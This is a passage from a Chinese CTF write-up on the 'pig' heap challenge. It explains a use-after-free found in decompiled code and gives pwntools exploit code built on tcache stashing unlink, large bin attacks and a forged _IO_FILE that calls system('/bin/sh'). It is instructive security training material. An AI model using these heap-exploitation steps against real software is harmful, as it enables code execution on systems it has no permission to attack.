class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(a1, users, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0xC0</span>), users + <span class="number">0xC0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0x120</span>), users + <span class="number">0x120</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0x138</span>), users + <span class="number">0x138</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是将结构体的每一部分都给到了单个pig，但是在切换角色时储存单个pig的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_3B3E</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(users, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(users + <span class="number">192</span>, (a1 + <span class="number">192</span>), <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(users + <span class="number">312</span>, (a1 + <span class="number">312</span>), <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里出现了问题，他并没有将chunk_exist赋值过去，所以就造成了UAF漏洞。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>利用思路其实就是首先泄漏出libc地址，接着泄漏heap地址，利用tcache stashing unlink attack+和large bin attack实现在free_hook附近分配chunk，但是由于calloc不能够直接申请tcache当中的chunk，所以我们需要第二次利用large bin attack修改掉_IO_list_all，并且这里写入的堆地址必须是第三个用户的堆地址，这里我们再改变_chain到我们最后的gift堆块，最后在gift堆块伪造_IO_FILE结构体。</p><h3 id="泄漏libc地址-amp-heap地址"><a href="#泄漏libc地址-amp-heap地址" class="headerlink" title="泄漏libc地址&amp;heap地址"></a>泄漏libc地址&amp;heap地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A7</span></span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: aaaaaaa\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h3 id="为tcache-stashing-unlink-attack做准备"><a href="#为tcache-stashing-unlink-attack做准备" class="headerlink" title="为tcache stashing unlink attack做准备"></a>为tcache stashing unlink attack做准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">3</span>)  <span class="comment"># B4</span></span><br><span class="line">    delete(i)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A8</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A9</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B6</span></span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A12</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B8</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_base+<span class="number">0x12c40</span>) +</span><br><span class="line">     p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure><h3 id="第一次large-bin-attack"><a href="#第一次large-bin-attack" class="headerlink" title="第一次large bin attack"></a>第一次large bin attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A13</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B9</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A14</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A15</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x28</span>))</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># C0</span></span><br></pre></td></tr></table></figure><h3 id="第二次large-bin-attack"><a href="#第二次large-bin-attack" class="headerlink" title="第二次large bin attack"></a>第二次large bin attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C1</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C2</span></span><br></pre></td></tr></table></figure><h3 id="修改-chain的指向"><a href="#修改-chain的指向" class="headerlink" title="修改_chain的指向"></a>修改_chain的指向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x13c00</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x410</span>, payload)  <span class="comment"># C3</span></span><br></pre></td></tr></table></figure><h3 id="伪造IO-FILE结构"><a href="#伪造IO-FILE结构" class="headerlink" title="伪造IO_FILE结构"></a>伪造IO_FILE结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _IO_buf_end=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Gift:&quot;</span>)</span><br><span class="line">_IO_str_jumps = libc_base+<span class="number">0x1ed560</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(<span class="number">1</span>, <span class="number">0xffffffffffff</span>, heap_base +</span><br><span class="line">                        <span class="number">0x13c00</span>+<span class="number">0xe0</span>, heap_base+<span class="number">0x13c00</span>+<span class="number">0xe0</span>+<span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(file_struct[<span class="number">0x10</span>:])))</span><br><span class="line">r.sendline(file_struct[<span class="number">0x10</span>:])</span><br></pre></td></tr></table></figure><p>这里解释一下为什么这么构造，把源码扒过来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>可以看到这里的old_buf也就是fp-&gt;_IO_buf_base然后old_blen也可以看到上面的定义，所以我们需要构造两个差值为0x18，并且我们可以看到，我们复制的内容也是从old_buf开始的，然后我们分配的tcahce其实是需要写三个p64才能修改到free_hook。</p><p><img src="/images/image-20220301113121625.png" alt="image-20220301113121625"></p><p>我们这里的思路其实就是修改free_hook为system，那么我们free的时候就需要参数为<code>/bin/sh</code>所以我们old_buf就这样确定了，所以在构造结构体时后面跟了两个p64(system)这里和前面的不一样。</p><h3 id="所以综上得出，exp"><a href="#所以综上得出，exp" class="headerlink" title="所以综上得出，exp"></a>所以综上得出，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct pig&#123;</span></span><br><span class="line"><span class="string">    chunk_arr[24];</span></span><br><span class="line"><span class="string">    chunk_size[24];</span></span><br><span class="line"><span class="string">    chunk_exist[24];</span></span><br><span class="line"><span class="string">    chunk_freed[24];</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct all_pig&#123;</span></span><br><span class="line"><span class="string">    Peppa_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Peppa_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Peppa_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Peppa_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Peppa_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">    Mummy_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Mummy_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Mummy_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Mummy_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Mummy_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">    Daddy_chunk_arr[24];   size: 0xc0</span></span><br><span class="line"><span class="string">    Daddy_chunk_size[24];  size: 0x60</span></span><br><span class="line"><span class="string">    Daddy_chunk_exist[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Daddy_chunk_freed[24]; size: 0x18</span></span><br><span class="line"><span class="string">    Daddy_last_chunk_size; size: 0x4</span></span><br><span class="line"><span class="string">    padding;               size: 0x4</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password&#123;</span></span><br><span class="line"><span class="string">    Peppa: A\x01\x95\xc9\x1c</span></span><br><span class="line"><span class="string">    Mummy: B\x01\x87\xc3\x19</span></span><br><span class="line"><span class="string">    Daddy: C\x01\xf7\x3c\x32</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message size: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;&#x27;s message: &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;&#x27;s message: &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Input the message index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">role</span>):</span></span><br><span class="line">    r.recvuntil(<span 